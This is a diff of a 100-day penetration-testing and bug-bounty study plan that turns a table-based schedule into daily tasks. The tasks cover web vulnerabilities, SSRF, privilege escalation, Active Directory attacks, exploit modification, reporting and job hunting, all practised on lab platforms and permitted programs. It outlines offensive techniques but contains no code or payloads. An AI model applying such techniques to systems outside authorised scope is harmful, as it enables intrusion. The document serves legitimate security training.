-| 89 | CSC410 Distributed Systems | Mock professional penetration test | Full toolkit, professional reporting, time management | **VulnHub Multi-Host Network: DevGuru, Wpwn, or similar** - Perform professional-grade penetration test on multi-machine network: scoping phase, reconnaissance(complete network mapping), vulnerability assessment (identify all entry points), exploitation phase (gain access to all systems), post-exploitation (data exfiltration simulation, persistence), reporting phase. Maintain detailed notes throughout. Deliver 15-page professional penetration test report with: executive summary, scope/methodology, network diagram, findings (ranked by severity with CVSS), evidence (screenshots/logs), remediation roadmap, appendices. Document professional pentest workflow: client communication simulation, comprehensive documentation, quality assurance with deliverable matching industry standards. |
-| 90 | Weekend | HackTheBox medium-rated retired machines | All tools, detailed documentation, writeups | **HackTheBox: 2 Medium Machines (eg. Writeup, Admirer)** - Complete 2 Medium-difficulty retired machines: thorough reconnaissance (full port scans, service enumeration, web directory brute-forcing), identify complex vulnerabilities (chained exploits, obscure CVEs), achieve user and root flags. Write detailed walkthrough for each: reconnaissance methodology, exploitation process, privilege escalation techniques, lessons learned, alternative methods. Document HTB methodology: systematic approach to medium-difficulty targets, persistence through obstacles, thorough documentation with writeups demonstrating ability to handle realistic difficulty levels. |
-| 91 | Weekend | Manual exploit development and modification | Exploit-DB, searchsploit, Python, debugging tools | **Exploit Modification Practice** - Find 5 exploits from Exploit-DB for discovered vulnerabilities. Read exploit code understanding: vulnerability mechanics, payload structure, exploitation technique. Modify exploits for lab environment: change IPs/ports, adapt payloads, fix Python 2 to 3 compatibility, add error handling, improve reliability. Test modified exploits. Successfully gain shells using adapted exploits. Document exploit modification: code analysis, debugging process, adaptation techniques with working modified exploits showing ability to adapt public exploits to specific scenarios. |
-
-**Week 13 Cumulative KPIs:** Labs completed: 91 | Reports written: 40 | Tools mastered: 110
+**Week 3 Measurable Outcomes:**
+✓ Can identify and exploit basic SQLi, command injection, XSS
+✓ 10+ PortSwigger Academy labs completed
+✓ 5 OWASP Juice Shop flags captured
+✓ First practice vulnerability report written
 
 ---
 
-## WEEK 14 (Days 92-100): Final Push, Interview Prep & Job Applications
+### **WEEK 4: Authentication & Authorization Flaws**
 
-| Day | Course Unit (4hrs) | Red-Team Focus (6hrs) | Tools | Lab/Target & Daily Objective |
-|-----|-------------|----------------|-------|------------|
-| 92 | CSC411 MIS | Technical interview preparation | Whiteboarding, communication, technical explanations | **Interview Prep: Technical Questions** - Prepare answers to 50 common pentesting interview questions: "Explain SQL injection to a non-technical person", "Walk me through your methodology", "What's the difference between red/blue/purple team?", "Describe a challenging finding", "How do you prioritize vulnerabilities?", "Explain OWASP Top 10". Practice explaining technical concepts simply. Prepare STAR format stories for behavioral questions. Create question bank with practiced responses. Document interview prep: question categories, answer frameworks, communication strategies with polished answers demonstrating technical knowledge and communication skills. |
-| 93 | CSC471 Multimedia Tech | Live exploitation demonstrations for interviews | VirtualBox, presentation skills, time management | **Interview Demo Preparation** - Prepare 3 live demonstrations (10-15 min each): Demo 1 - SQL injection on DVWA showing manual and automated exploitation; Demo 2 - Linux privilege escalation on VulnHub showing enumeration and exploitation; Demo 3 - Custom tool demonstration showing reconnaissance automation. Practice delivery: clear narration, smooth execution, handling failures gracefully. Test in clean VMs ensuring reproducibility. Record practice runs. Document demonstration prep: setup checklist, talking points, contingency plans with polished demos ready for technical interviews. |
-| 94 | CSC470 Network Protocols | Portfolio final review and polish | All portfolio materials, peer review, quality check | **Portfolio Quality Assurance** - Final review of all materials: GitHub (README, writeups, tool documentation), resume (grammar, metrics, ATS optimization), LinkedIn (completeness, recommendations), blog (formatting, SEO), video demos (audio quality, clarity). Get peer review or mentor feedback. Fix broken links, typos, formatting issues. Ensure consistency across all platforms. Update skills matrix. Add final labs to portfolio. Document portfolio QA: quality checklist, peer feedback integration, professional presentation with polished portfolio demonstrating professionalism and attention to detail. |
-| 95 | CSC412 Operations Research | Job search strategy and application preparation | LinkedIn, Indeed, job boards, company research | **Job Application Campaign** - Identify 20 target companies: cybersecurity firms (consulting), product companies (security teams), bug bounty platforms, startups. Research each: company culture, tech stack, security team size, open positions. Customize resume for each role emphasizing relevant skills. Write tailored cover letters. Prepare company-specific questions. Track applications in spreadsheet. Document job search: target identification, application customization, networking approach with organized application campaign showing strategic job hunting. |
-| 96 | CSC413 UNIX Systems | Final comprehensive penetration test | All tools, professional methodology | **VulnHub Complex Network: Final Assessment** - Perform final comprehensive penetration test on complex multi-host network (e.g., HackTheBox Pro Lab trial, TryHackMe Wreath, or VulnHub multi-VM setup). Demonstrate complete skill set: reconnaissance, enumeration, web exploitation, privilege escalation, lateral movement, AD attacks, post-exploitation, reporting. Simulate real-world engagement with time management. Deliver professional deliverable. Document final assessment: complete methodology execution, professional deliverable quality, skills integration with final project showcasing job-readiness and comprehensive skill mastery. |
-| 97 | Weekend | Bug bounty live hunting and submissions | All tools, bug bounty platforms, professional reporting | **Live Bug Bounty Hunting - Submission Attempt** - Dedicate full day to live bug bounty hunting on 2-3 permitted programs. Target realistic vulnerabilities: authentication flaws, authorization issues, information disclosure, XSS, SSRF. Aim to identify and submit 2-3 valid vulnerabilities. Write professional reports following platform guidelines. Submit via HackerOne/Bugcrowd. Track submissions. Document bug bounty experience: hunting methodology, report writing, submission process, platform interaction with real-world bug bounty attempts showing practical application of skills. |
-| 98 | Weekend | Skills certification and path completion | TryHackMe, HackTheBox, achievement tracking | **TryHackMe Offensive Pentesting Path Completion** - Complete any remaining TryHackMe Offensive Pentesting path rooms. Achieve path completion certificate. Complete HTB Starting Point and fundamental tracks. Collect all achievement badges. Update resume with completions. Take screenshots of achievements. Document learning journey: completed paths, earned badges, skill progression with certifications and achievements validating skills to employers. |
-| 99 | Weekend | Community engagement and networking | Twitter/X, LinkedIn, Discord, Reddit | **Security Community Engagement** - Build security community presence: Follow 50 security researchers on Twitter/X, join 5 security Discord servers (TryHackMe, HackTheBox, NetSecFocus, Bug Bounty Forum), engage in Reddit r/netsec and r/AskNetsec. Share 3 writeups on social media. Comment on others' content. Connect with 20 security professionals on LinkedIn. Attend virtual security meetup/webinar. Document networking: community participation, content sharing, relationship building with established professional network showing industry engagement. |
-| 100 | Final Day | Final review, celebration, Day 101 planning | Portfolio review, application tracking, goal setting | **100-Day Program Completion & Day 101 Launch** - Complete final checklist: ✓ 100+ labs completed, ✓ 45+ reports written, ✓ 115+ tools mastered, ✓ GitHub portfolio live, ✓ Professional resume, ✓ LinkedIn optimized, ✓ Blog published, ✓ 20 job applications ready, ✓ Interview demos prepared, ✓ Bug bounty submissions attempted. Submit first batch of job applications. Schedule informational interviews. Plan Week 15-20: continued bug bounty hunting, daily lab practice, interview preparation. Celebrate achievement. Document Day 101 plan: job search strategy, continued learning, interview scheduling with concrete action plan for immediate post-program job search launch. |
+**Learning Goals:**
+- Identify broken authentication mechanisms
+- Test for IDOR vulnerabilities
+- Understand session management issues
 
-**Week 14 Cumulative KPIs:** Labs completed: 100+ | Reports written: 45+ | Tools mastered: 115+
+**Day 22** (2.5hr) / (4hr)
+- *Reading:* OWASP Authentication Cheat Sheet (1hr)
+- *Lab:* PortSwigger "Authentication vulnerabilities" labs (1.5hr)
+- *(4hr):* Complete all password-based authentication labs
+
+**Day 23** (2.5hr) / (4hr)
+- *Practice:* Test for username enumeration in 3 practice apps (1hr)
+- *Lab:* PortSwigger "Multi-factor authentication" bypass labs (1hr)
+- *Documentation:* Authentication testing checklist (0.5hr)
+- *(4hr):* DVWA "Brute Force" module (all security levels)
+
+**Day 24** (2.5hr) / (4hr)
+- *Reading:* IDOR vulnerability patterns (HackerOne reports) (1hr)
+- *Lab:* PortSwigger "Access control vulnerabilities" (1.5hr)
+- *(4hr):* Complete all horizontal/vertical privilege escalation labs
+
+**Day 25** (2.5hr) / (4hr)
+- *Practice:* OWASP Juice Shop - find 3 access control bugs (1.5hr)
+- *Tool:* Learn Autorize/AuthMatrix Burp extensions (1hr)
+- *(4hr):* Test for IDOR in WebGoat access control lessons
+
+**Day 26** (2.5hr) / (4hr)
+- *Lab:* TryHackMe "Authentication Bypass" room (1.5hr)
+- *Practice:* Session token analysis - entropy, predictability (1hr)
+- *(4hr):* Complete TryHackMe "OWASP Juice Shop" room
+
+**Weekend Day 27** (5hr) / (6hr)
+- *Major Lab:* HTB "Bastard" or similar box with auth bypass (4hr)
+- *Writeup:* Document authentication testing methodology (1hr)
+- *(6hr):* Additional HTB box or TryHackMe authentication path
+
+**Weekend Day 28** (5hr) / (6hr)
+- *Practice:* Create test plan for authentication testing (1hr)
+- *Lab:* Complete remaining PortSwigger authentication labs (3hr)
+- *Portfolio:* Write "Top 5 Authentication Bugs I've Found" blog post (practice) (1hr)
+- *(6hr):* Review 20 HackerOne authentication bug reports
+
+**Week 4 Measurable Outcomes:**
+✓ Authentication/authorization testing methodology documented
+✓ Can identify IDOR, broken auth, session issues
+✓ 15+ PortSwigger labs completed (cumulative 25+)
+✓ 1 HTB box completed with authentication focus
 
 ---
+
+### **WEEK 5: Business Logic & SSRF**
+
+**Learning Goals:**
+- Identify business logic flaws
+- Test for Server-Side Request Forgery
+- Understand race conditions and payment logic bugs
+
+**Day 29** (2.5hr) / (4hr)
+- *Reading:* Business logic vulnerability patterns (1hr)
+- *Lab:* PortSwigger "Business logic vulnerabilities" (all labs) (1.5hr)
+- *(4hr):* OWASP Juice Shop - find 3 business logic bugs
+
+**Day 30** (2.5hr) / (4hr)
+- *Reading:* SSRF vulnerability guide (1hr)
+- *Lab:* PortSwigger "SSRF" labs (basic + blind) (1.5hr)
+- *(4hr):* Complete all SSRF labs including advanced
+
+**Day 31** (2.5hr) / (4hr)
+- *Practice:* Test for SSRF in known vulnerable apps (1hr)
+- *Lab:* TryHackMe "SSRF" room (1hr)
+- *Documentation:* SSRF payload cheat sheet (0.5hr)
+- *(4hr):* Research cloud metadata endpoints (AWS, GCP, Azure)
+
+**Day 32** (2.5hr) / (4hr)
+- *Reading:* Race condition vulnerabilities in web apps (1hr)
+- *Practice:* Use Burp Turbo Intruder for race condition testing (1hr)
+- *Lab:* PortSwigger race condition labs (0.5hr)
+- *(4hr):* OWASP Juice Shop - race condition challenges
+
+**Day 33** (2.5hr) / (4hr)
+- *Lab:* TryHackMe "Overpass" series (business logic focus) (2hr)
+- *Review:* Analyze 10 business logic bugs on HackerOne (0.5hr)
+- *(4hr):* Create business logic testing checklist
+
+**Weekend Day 34** (5hr) / (6hr)
+- *Major Lab:* HTB box with SSRF or business logic (4hr)
+- *Alternative:* PentesterLab SSRF exercises (4hr)
+- *Writeup:* Document findings (1hr)
+- *(6hr):* Additional practice with cloud SSRF scenarios
+
+**Weekend Day 35** (5hr) / (6hr)
+- *Practice:* Full test of OWASP Juice Shop with business logic focus (3hr)
+- *Documentation:* Write comprehensive business logic testing guide (2hr)
+- *(6hr):* Build automated SSRF scanner script (Python)
+
+**Week 5 Measurable Outcomes:**
+✓ Can identify business logic flaws and SSRF
+✓ Business logic testing methodology documented
+✓ 30+ PortSwigger labs completed (cumulative)
+✓ Understanding of race conditions and payment logic
+
+---
+
+### **WEEK 6: API Security & Modern Web**
+
+**Learning Goals:**
+- Test REST and GraphQL APIs
+- Understand JWT vulnerabilities
+- Practice API fuzzing and parameter tampering
+
+**Day 36** (2.5hr) / (4hr)
+- *Reading:* OWASP API Security Top 10 (1hr)
+- *Tool:* Learn Postman for API testing (1hr)
+- *Practice:* Explore crAPI (vulnerable API) (0.5hr)
+- *(4hr):* Complete crAPI challenges 1-5
+
+**Day 37** (2.5hr) / (4hr)
+- *Lab:* PortSwigger "API testing" labs (1.5hr)
+- *Practice:* JWT.io - analyze and manipulate tokens (1hr)
+- *(4hr):* PortSwigger JWT attack labs (all)
+
+**Day 38** (2.5hr) / (4hr)
+- *Reading:* GraphQL security testing guide (1hr)
+- *Lab:* TryHackMe "GraphQL" room (or DVWA GraphQL) (1.5hr)
+- *(4hr):* Practice GraphQL introspection and injection
+
+**Day 39** (2.5hr) / (4hr)
+- *Practice:* API fuzzing with ffuf and custom wordlists (1.5hr)
+- *Lab:* Test vAPI (vulnerable API) endpoints (1hr)
+- *(4hr):* Build API testing checklist and automation script
+
+**Day 40** (2.5hr) / (4hr)
+- *Lab:* Complete remaining crAPI challenges (2hr)
+- *Documentation:* API testing methodology (0.5hr)
+- *(4hr):* Write API security writeup for portfolio
+
+**Weekend Day 41** (5hr) / (6hr)
+- *Major Lab:* HTB box with API component (4hr)
+- *Alternative:* TryHackMe API Hacking path (4hr)
+- *Writeup:* API testing engagement report (1hr)
+- *(6hr):* Additional API security practice
+
+**Weekend Day 42** (5hr) / (6hr)
+- *Review:* Consolidate Weeks 1-6 notes (1hr)
+- *Practice:* Comprehensive test of one web application (all techniques) (3hr)
+- *Portfolio:* Update GitHub with all writeups, ensure 5+ published (1hr)
+- *(6hr):* Create video walkthrough of one lab for portfolio
+
+**Week 6 Measurable Outcomes:**
+✓ Can test REST and GraphQL APIs
+✓ Understanding of JWT vulnerabilities
+✓ API testing methodology documented
+✓ Portfolio has 5+ writeups on GitHub
+
+**MID-POINT ASSESSMENT:**
+- Labs completed: 15-20
+- PortSwigger Academy: 35-40 labs
+- GitHub writeups: 5-7
+- Practice reports written: 2-3
+
+---
+
+### **WEEK 7: Infrastructure - Linux & Privilege Escalation**
+
+**Learning Goals:**
+- Master Linux privilege escalation techniques
+- Understand common misconfigurations
+- Practice enumeration automation
+
+**Day 43** (2.5hr) / (4hr)
+- *Reading:* Linux privilege escalation methodology (g0tmi1k's guide) (1hr)
+- *Practice:* Set up local Linux VM for testing (0.5hr)
+- *Lab:* TryHackMe "Linux PrivEsc" room (1hr)
+- *(4hr):* Complete full "Linux PrivEsc" room
+
+**Day 44** (2.5hr) / (4hr)
+- *Tool:* Learn LinPEAS, LinEnum enumeration scripts (1hr)
+- *Lab:* TryHackMe "Linux PrivEsc Arena" (1.5hr)
+- *(4hr):* Practice all SUID/SGID exploitation techniques
+
+**Day 45** (2.5hr) / (4hr)
+- *Practice:* Kernel exploits - when and how to use (1hr)
+- *Lab:* Exploit cron jobs, PATH hijacking in practice VMs (1.5hr)
+- *(4hr):* TryHackMe "Linux Privilege Escalation" advanced challenges
+
+**Day 46** (2.5hr) / (4hr)
+- *Lab:* HTB "Shocker" (easy retired box - shellshock) (2hr)
+- *Writeup:* Document privilege escalation path (0.5hr)
+- *(4hr):* Complete HTB "Bashed" box
+
+**Day 47** (2.5hr) / (4hr)
+- *Practice:* Sudo misconfigurations exploitation (GTFOBins) (1hr)
+- *Lab:* TryHackMe "Sudo Security Bypass" room (1hr)
+- *Documentation:* Linux privesc cheat sheet (0.5hr)
+- *(4hr):* Practice NFS, LXD/Docker escape techniques
+
+**Weekend Day 48** (5hr) / (6hr)
+- *Major Lab:* HTB "Beep" or "Nibbles" (4hr)
+- *Writeup:* Complete methodology documentation (1hr)
+- *(6hr):* Additional HTB box with Linux focus
+
+**Weekend Day 49** (5hr) / (6hr)
+- *Practice:* Build automated privesc enumeration script (2hr)
+- *Lab:* VulnHub boxes - at least 2 Linux machines (3hr)
+- *(6hr):* Create video walkthrough of privilege escalation
+
+**Week 7 Measurable Outcomes:**
+✓ Linux privilege escalation methodology mastered
+✓ 3-4 HTB/VulnHub boxes completed
+✓ Custom enumeration script in GitHub
+✓ Privesc cheat sheet documented
+
+---
+
+### **WEEK 8: Infrastructure - Windows & Active Directory Basics**
+
+**Learning Goals:**
+- Windows privilege escalation fundamentals
+- Basic Active Directory enumeration
+- Understanding Windows misconfigurations
+
+**Day 50** (2.5hr) / (4hr)
+- *Reading:* Windows privilege escalation guide (1hr)
+- *Lab:* TryHackMe "Windows PrivEsc" room (1.5hr)
+- *(4hr):* Complete full room including all vectors
+
+**Day 51** (2.5hr) / (4hr)
+- *Tool:* Learn WinPEAS, PowerUp enumeration (1hr)
+- *Practice:* Windows service exploitation (1hr)
+- *Lab:* Registry and file permission exploitation (0.5hr)
+- *(4hr):* Practice unquoted service paths, DLL hijacking
+
+**Day 52** (2.5hr) / (4hr)
+- *Lab:* TryHackMe "Windows PrivEsc Arena" (2hr)
+- *Documentation:* Windows privesc cheat sheet (0.5hr)
+- *(4hr):* Complete TryHackMe "Steel Mountain" room
+
+**Day 53** (2.5hr) / (4hr)
+- *Reading:* Active Directory basics (1hr)
+- *Lab:* TryHackMe "Active Directory Basics" room (1.5hr)
+- *(4hr):* TryHackMe "Attacking Kerberos" room
+
+**Day 54** (2.5hr) / (4hr)
+- *Lab:* HTB "Devel" (easy Windows box) (2hr)
+- *Writeup:* Document exploitation path (0.5hr)
+- *(4hr):* Complete HTB "Optimum" or "Grandpa"
+
+**Weekend Day 55** (5hr) / (6hr)
+- *Major Lab:* HTB "Blue" (EternalBlue) (3hr)
+- *Practice:* Windows enumeration on multiple VMs (2hr)
+- *(6hr):* Additional Windows-focused HTB box
+
+**Weekend Day 56** (5hr) / (6hr)
+- *Lab:* TryHackMe "Attacktive Directory" full room (4hr)
+- *Documentation:* Infrastructure testing methodology (1hr)
+- *(6hr):* Create comprehensive infrastructure testing checklist
+
+**Week 8 Measurable Outcomes:**
+✓ Windows privilege escalation proficiency
+✓ Basic AD enumeration skills
+✓ 6-8 HTB/TryHackMe boxes completed (cumulative)
+✓ Infrastructure methodology documented
+
+---
+
+### **WEEK 9: Integration - Full Engagement Simulation**
+
+**Learning Goals:**
+- Conduct complete assessments start-to-finish
+- Write professional penetration test reports
+- Practice time management and prioritization
+
+**Day 57** (2.5hr) / (4hr)
+- *Reading:* Professional pentest report templates (study 3 examples) (1hr)
+- *Setup:* Choose target for mock assessment (TryHackMe network/room) (0.5hr)
+- *Phase 1:* Reconnaissance and enumeration (1hr)
+- *(4hr):* Complete recon, begin vulnerability assessment
+
+**Day 58** (2.5hr) / (4hr)
+- *Phase 2:* Vulnerability identification and exploitation (2hr)
+- *Documentation:* Screenshot and note all findings (0.5hr)
+- *(4hr):* Complete exploitation, begin post-exploitation
+
+**Day 59** (2.5hr) / (4hr)
+- *Phase 3:* Post-exploitation and privilege escalation (1.5hr)
+- *Documentation:* Evidence collection (1hr)
+- *(4hr):* Complete full attack chain documentation
+
+**Day 60** (2.5hr) / (4hr)
+- *Reporting:* Write executive summary (1hr)
+- *Reporting:* Technical findings section (1.5hr)
+- *(4hr):* Complete full professional report
+
+**Day 61** (2.5hr) / (4hr)
+- *Reporting:* Remediation recommendations (1hr)
+- *Review:* Self-edit and improve report (1hr)
+- *Portfolio:* Sanitize and add to GitHub (0.5hr)
+- *(4hr):* Create presentation slides for findings
+
+**Weekend Day 62** (5hr) / (6hr)
+- *Second Mock Assessment:* Different target type (web vs. infrastructure) (4hr)
+- *Fast reporting:* Complete report in 1 day (1hr)
+- *(6hr):* Full assessment with detailed technical appendix
+
+**Weekend Day 63** (5hr) / (6hr)
+- *Practice:* TryHackMe "Holo" network (or similar multi-machine) (5hr)
+- *(6hr):* Complete and document full network compromise
+
+**Week 9 Measurable Outcomes:**
+✓ 2 complete mock assessments with reports
+✓ Professional report writing skills
+✓ Portfolio has 2 full engagement writeups
+✓ Time management for assessments practiced
+
+---
+
+### **WEEK 10: Report Writing & Advanced Topics**
+
+**Learning Goals:**
+- Refine technical writing
+- Explore advanced vulnerability classes
+- Prepare for real-world testing
+
+**Day 64** (2.5hr) / (4hr)
+- *Reading:* Study 5 HackerOne disclosed reports for writing style (1.5hr)
+- *Practice:* Rewrite one of your reports based on learnings (1hr)
+- *(4hr):* Create report template with automation (scripts)
+
+**Day 65** (2.5hr) / (4hr)
+- *Topic:* Server-Side Template Injection (SSTI) (1hr reading)
+- *Lab:* PortSwigger SSTI labs (1.5hr)
+- *(4hr):* TryHackMe rooms with SSTI
+
+**Day 66** (2.5hr) / (4hr)
+- *Topic:* XML External Entity (XXE) attacks (1hr reading)
+- *Lab:* PortSwigger XXE labs (1.5hr)
+- *(4hr):* Practice XXE out-of-band techniques
+
+**Day 67** (2.5hr) / (4hr)
+- *Topic:* Insecure Deserialization (1hr reading)
+- *Lab:* PortSwigger deserialization labs (1.5hr)
+- *(4hr):* Java/PHP deserialization practice
+
+**Day 68** (2.5hr) / (4hr)
+- *Topic:* CORS and WebSocket vulnerabilities (1hr)
+- *Lab:* PortSwigger CORS and WebSocket labs (1.5hr)
+- *(4hr):* Additional web cache vulnerabilities
+
+**Weekend Day 69** (5hr) / (6hr)
+- *Lab:* HTB "Beep" or similar box with multiple vectors (4hr)
+- *Writeup:* Document all identified vulnerabilities (1hr)
+- *(6hr):* Additional intermediate HTB box
+
+**Weekend Day 70** (5hr) / (6hr)
+- *Review:* Portfolio audit - ensure 8-10 writeups published (2hr)
+- *Practice:* Complete any remaining PortSwigger Academy modules (3hr)
+- *(6hr):* Build personal vulnerability testing checklist (comprehensive)
+
+**Week 10 Measurable Outcomes:**
+✓ Advanced vulnerability classes understood
+✓ 50+ PortSwigger labs completed (cumulative)
+✓ Portfolio has 8-10 quality writeups
+✓ Report writing refined and professional
+
+---
+
+### **WEEK 11: Bug Bounty Preparation**
+
+**Learning Goals:**
+- Choose appropriate programs
+- Understand scope and rules of engagement
+- Perform real reconnaissance legally
+
+**Day 71** (2.5hr) / (4hr)
+- *Reading:* "Getting Started in Bug Bounty" guides (multiple sources) (1hr)
+- *Research:* Identify 5 suitable programs (VDP or low competition) (1hr)
+- *Setup:* Organize tooling for BB (Burp projects, notes system) (0.5hr)
+- *(4hr):* Read program policies thoroughly for chosen targets
+
+**Day 72** (2.5hr) / (4hr)
+- *Recon:* Full reconnaissance on Program #1 (2hr)
+- *Documentation:* Track all subdomains, endpoints, interesting findings (0.5hr)
+- *(4hr):* Deep enumeration with all tools
+
+**Day 73** (2.5hr) / (4hr)
+- *Testing:* Begin manual testing on Program #1 (2hr)
+- *Focus:* Low-hanging fruit (IDOR, XSS, open redirects) (0.5hr)
+- *(4hr):* Comprehensive testing across attack surface
+
+**Day 74** (2.5hr) / (4hr)
+- *Recon:* Full reconnaissance on Program #2 (2hr)
+- *Analysis:* Compare with Program #1 for learning (0.5hr)
+- *(4hr):* Automated scanning + manual verification
+
+**Day 75** (2.5hr) / (4hr)
+- *Testing:* Manual testing on Program #2 (2hr)
+- *Documentation:* Track findings (even duplicates/informational) (0.5hr)
+- *(4hr):* Focus on one vulnerability class deeply
+
+**Weekend Day 76** (5hr) / (6hr)
+- *Recon + Testing:* Program #3 full assessment (4hr)
+- *Review:* Analyze what you're finding vs. missing (1hr)
+- *(6hr):* Test additional program or deeper testing
+
+**Weekend Day 77** (5hr) / (6hr)
+- *Practice:* Review last 50 disclosed reports for inspiration (2hr)
+- *Testing:* Return to Program #1 with fresh perspective (3hr)
+- *(6hr):* Focus on business logic and API endpoints
+
+**Week 11 Measurable Outcomes:**
+✓ 3 programs thoroughly tested
+✓ Complete attack surface mapping for each
+✓ At least 1-2 findings ready to report (any severity)
+✓ Understanding of program triage preferences
+
+---
+
+### **WEEK 12: First Submissions**
+
+**Learning Goals:**
+- Submit first real bug reports
+- Handle triaging process
+- Deal with duplicates and rejections constructively
+
+**Day 78** (2.5hr) / (4hr)
+- *Preparation:* Review best finding from Week 11 (0.5hr)
+- *Reporting:* Write first bug report (follow template) (1.5hr)
+- *Submission:* Submit to Program #1 (0.5hr)
+- *(4hr):* Prepare and submit second finding
+
+**Day 79** (2.5hr) / (4hr)
+- *Testing:* Continue testing Program #2 with focus (2hr)
+- *Documentation:* Track new findings meticulously (0.5hr)
+- *(4hr):* Deep dive into one attack vector (e.g., all API endpoints)
+
+**Day 80** (2.5hr) / (4hr)
+- *Reporting:* Write second bug report if finding is valid (1.5hr)
+- *Research:* Study how to improve based on similar reports (1hr)
+- *(4hr):* Submit second report, begin testing Program #3 deeply
+
+**Day 81** (2.5hr) / (4hr)
+- *Testing:* Focus on authentication/authorization in current programs (2hr)
+- *Learning:* Review program responses to your reports (0.5hr)
+- *(4hr):* Test newly discovered endpoints from recon
+
+**Day 82** (2.5hr) / (4hr)
+- *Recon:* Expand to Program #4 or #5 (1.5hr)
+- *Testing:* Quick wins hunting (low-hanging fruit) (1hr)
+- *(4hr):* Comprehensive testing of one application component
+
+**Weekend Day 83** (5hr) / (6hr)
+- *Major Testing:* Deep dive on most promising program (4hr)
+- *Goal:* Find at least one medium severity issue (1hr documentation)
+- *(6hr):* Test additional applications or programs
+
+**Weekend Day 84** (5hr) / (6hr)
+- *Reporting:* Write and submit third bug report (2hr)
+- *Practice:* Test 2-3 additional programs for practice (3hr)
+- *(6hr):* Create personal "lessons learned" document from submissions
+
+**Week 12 Measurable Outcomes:**
+✓ 2-3 bug reports submitted (any severity/status)
+✓ Experience with triaging process
+✓ 5+ programs tested total
+✓ Resilience to duplicates/N/A responses developed
+
+---
+
+### **WEEK 13: Portfolio Building & Skill Refinement**
+
+**Learning Goals:**
+- Create professional GitHub portfolio
+- Write compelling technical blog posts
+- Prepare interview materials
+
+**Day 85** (2.5hr) / (4hr)
+- *Portfolio:* Audit all GitHub content for quality (1hr)
+- *Writing:* Create README.md with professional summary (1hr)
+- *Cleanup:* Ensure all writeups are well-formatted (0.5hr)
+- *(4hr):* Add project descriptions, technologies used, outcomes
+
+**Day 86** (2.5hr) / (4hr)
+- *Writing:* "My First 100 Days in Bug Bounty" blog post (2hr)
+- *Publishing:* Post to Medium/Dev.to (0.5hr)
+- *(4hr):* Create second technical blog post on specific vulnerability
+
+**Day 87** (2.5hr) / (4hr)
+- *Resume:* Draft penetration tester resume (1.5hr)
+- *Content:* Include labs completed, skills, portfolio link (1hr)
+- *(4hr):* Create multiple versions (junior pentester, security analyst, etc.)
+
+**Day 88** (2.5hr) / (4hr)
+- *Practice:* Continue testing active programs (2hr)
+- *Learning:* Review areas where you struggled most (0.5hr)
+- *(4hr):* Deep practice in weakest area
+
+**Day 89** (2.5hr) / (4hr)
+- *Preparation:* Create interview talking points document (1hr)
+- *Practice:* Mock interview questions (technical + behavioral) (1.5hr)
+- *(4hr):* Record video explaining one vulnerability for portfolio
+
+**Weekend Day 90** (5hr) / (6hr)
+- *Lab Marathon:* Complete 2-3 remaining HTB boxes for portfolio (5hr)
+- *(6hr):* Add writeups immediately to GitHub
+
+**Weekend Day 91** (5hr) / (6hr)
+- *Writeup Sprint:* Ensure 10+ quality writeups on GitHub (3hr)
+- *LinkedIn:* Update profile with new skills and portfolio (1hr)
+- *Networking:* Engage with infosec community (Twitter, Discord) (1hr)
+- *(6hr):* Create portfolio website with highlights
+
+**Week 13 Measurable Outcomes:**
+✓ GitHub portfolio polished and professional
+✓ Resume completed and tailored
+✓ 10+ writeups published
+✓ Interview materials prepared
+✓ Blog posts published (1-2)
+
+---
+
+### **WEEK 14: Final Push & Advanced Preparation**
+
+**Learning Goals:**
+- Submit additional bug reports
+- Master interview preparation
+- Plan beyond Day 100
+
+**Day 92** (2.5hr) / (4hr)
+- *Testing:* Focus on quality over quantity in programs (2hr)
+- *Review:* Check status of all submitted reports (0.5hr)
+- *(4hr):* Test new program with fresh perspective
+
+**Day 93** (2.5hr) / (4hr)
+- *Lab:* Complete any remaining PortSwigger Academy modules (2hr)
+- *Certification Research:* Explore PNPT, eJPT, or OSCP paths (0.5hr)
+- *(4hr):* Practice lab if considering certification soon
+
+**Day 94** (2.5hr) / (4hr)
+- *Interview Prep:* Practice explaining technical concepts simply (1hr)
+- *Preparation:* Create STAR method stories for behavioral questions (1hr)
+- *Practice:* Record yourself answering common questions (0.5hr)
+- *(4hr):* Mock interview with friend or mentor
+
+**Day 95** (2.5hr) / (4hr)
+- *Testing:* Submit final bug report if you have valid finding (1.5hr)
+- *Documentation:* Ensure all testing is documented (1hr)
+- *(4hr):* Deep testing session on best program
+
+**Day 96** (2.5hr) / (4hr)
+- *Review:* Complete metrics tracking (see progress tracker below) (1hr)
+- *Planning:* Create Days 101-200 learning plan (1hr)
+- *Reflection:* Journal on progress and challenges (0.5hr)
+- *(4hr):* Build automation tools for future testing
+
+**Weekend Day 97** (5hr) / (6hr)
+- *Final Lab:* Choose challenging HTB box or TryHackMe network (4hr)
+- *Writeup:* Complete detailed methodology documentation (1hr)
+- *(6hr):* Additional advanced box (Medium difficulty)
+
+**Weekend Day 98** (5hr) / (6hr)
+- *Testing Marathon:* Full day testing real bug bounty programs (5hr)
+- *(6hr):* Focus on finding one quality bug for portfolio
+
+**Day 99** (2.5hr) / (4hr)
+- *Portfolio Final Review:* Ensure everything is polished (1hr)
+- *Applications:* Apply to 3-5 junior pentester positions (1.5hr)
+- *(4hr):* Customize resumes/cover letters for each application
+
+**Day 100** (2.5hr) / (4hr)
+- *Celebration:* Review all accomplishments (0.5hr)
+- *Planning:* Set 6-month and 1-year goals (1hr)
+- *Community:* Share journey on Twitter/LinkedIn (0.5hr)
+- *Testing:* Continue regular bug hunting (0.5hr)
+- *(4hr):* Write comprehensive "100 Days" retrospective blog post
+
+**Week 14 Measurable Outcomes:**
+✓ All portfolio materials finalized
+✓ Job applications submitted
+✓ Clear post-100-day plan created
+✓ 3-5 total bug submissions completed
+✓ Interview-ready confidence
+
+---
+
+## Example Daily Schedules
+
+### **Schedule A: 2.5 hours/weekday, 5 hours/weekend day**
+
+**Weekday Structure:**
+```
+18:00-18:15 (15min): Review yesterday's notes, set today's goal
+18:15-19:15 (60min): Primary learning/lab work (deep focus, no distractions)
+19:15-19:30 (15min): Break - walk, stretch, hydrate
+19:30-20:15 (45min): Practice/hands-on application
+20:15-20:30 (15min): Document findings, update progress tracker
+```
+
+**Weekend Structure:**
+```
+10:00-10:15 (15min): Week review, set session goals
+10:15-12:00 (105min): Deep lab work or HTB box
+12:00-12:30 (30min): Break - meal, rest
+12:30-13:45 (75min): Continuation or writeup
+13:45-14:15 (30min): Documentation and portfolio updates
+14:15-14:30 (15min): Plan next session
+```
+
+### **Schedule B: 4 hours/weekday, 6 hours/weekend day**
+
+**Weekday Structure:**
+```
